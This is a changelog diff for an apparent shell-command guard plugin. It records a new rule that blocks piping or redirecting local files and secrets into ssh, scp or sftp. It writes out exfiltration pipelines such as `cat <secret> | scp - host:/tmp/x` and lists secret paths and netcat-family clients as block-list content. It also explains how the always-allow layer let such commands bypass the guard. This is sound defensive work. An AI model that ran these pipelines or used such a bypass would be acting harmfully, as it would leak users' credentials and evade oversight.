@@ -28,6 +28,47 @@
   install/upgrade flows now name the probe as the one-command post-install
   verification.
 
+### ssh/scp/sftp-transport file exfiltration now blocks (DF-TERMINAL-JAIL-30)
+
+- **Rule** (new `builtin-net-file-exfil-ssh`, engine + byte-identical YAML
+  mirror): the raw-socket exfil family blocked `cat <file> | nc <host>`, and
+  its block message named ssh as deliberately excluded — so a local-file reader
+  piped into the fleet's own transport was a plain ALLOW, and
+  `cat <secret> | scp - host:/tmp/x` an APPROVED allow
+  (`rule_id=allow-cat-safe`), because the always-allow layer matched the
+  pipeline's reader segment and short-circuited before any egress rule. The new
+  rule is built arm-for-arm like `builtin-net-file-exfil-pipe` — same reader set
+  (`cat dd tar gzip base64 xxd od strings`), same non-operator operand
+  requirement, same chain-stopping stage gap with the tolerated `2>&1` fd merge,
+  same `{0,3}` intermediate-pipe budget, same word boundaries — with the client
+  set widened from `nc|ncat|netcat|socat` to `ssh|scp|sftp` (optionally
+  path-qualified). A second arm mirrors `builtin-net-file-exfil-redirect` for an
+  ssh-family client fed a SECRET source (`~`, `.ssh`/`.gnupg`/`.aws`/`.config`/
+  `.env`, key-file names) by a `<` redirect. It is a BLOCK rule in the blocklist
+  layer, so the decider's whole-command pass settles it before the allowlist;
+  it sits LAST in the blocklist so the earlier, more specific rules keep
+  claiming overlapping vectors (`cat manifest.txt | scp ~/.env host:/x` stays
+  `builtin-net-remote-tree-copy`).
+- **Scope, stated plainly**: the rule matches the TRANSPORT, not the remote
+  command (`scp -`/`sftp` carry none, and `ssh host tee` versus `ssh host wc -l`
+  differ only by the source path), so the backup form
+  `tar czf - /srv/data | ssh host 'cat > /srv/backup.tgz'` — pinned ALLOW
+  before this wave as the documented residual — now blocks too; a workflow that
+  needs it overrides the id to `warn`. Ordinary traffic is unaffected: `ssh
+  host`, tunnels, `ssh host uptime`, remote reads whose quoted command contains
+  `<`, `git push`, `tar cf backup.tar ~/docs`, and `tar cf - dir | gzip >
+  backup.tar.gz` all keep their ALLOW verdict.
+- **Tests**: 17 new block vectors + 2 wrapper-quoted vectors + 24 allow controls
+  in `plugin/test_interruptor.py` (block id, no-rewrite, shipped-mirror parity,
+  provenance, and a no-cross-claiming check that the raw-socket family keeps its
+  own ids), plus the same families in `plugin/test_escape_waves.py`. All fail
+  against the pre-fix engine (`allow` / `null`; the scp shape `allow` /
+  `allow-cat-safe`).
+- **Docs**: README rule list + counts + *Data-Out Boundary* §1d,
+  `specs/interruptor.md` rule table + verdict table, `docs/threat-model.md`
+  (exfil row + risk matrix), `skills/terminal-jail-usage/SKILL.md`,
+  `docs/rule-catalog.md` regenerated (55 rules: 36 block / 9 sandbox / 10 allow).
+
 ### Bridge-level integration tests run in-process; one real-exec parity test keeps the wire contract (VERSION-002)
 
 - **`plugin/test_interruptor_integration.py`** (load-hygiene, no coverage loss):
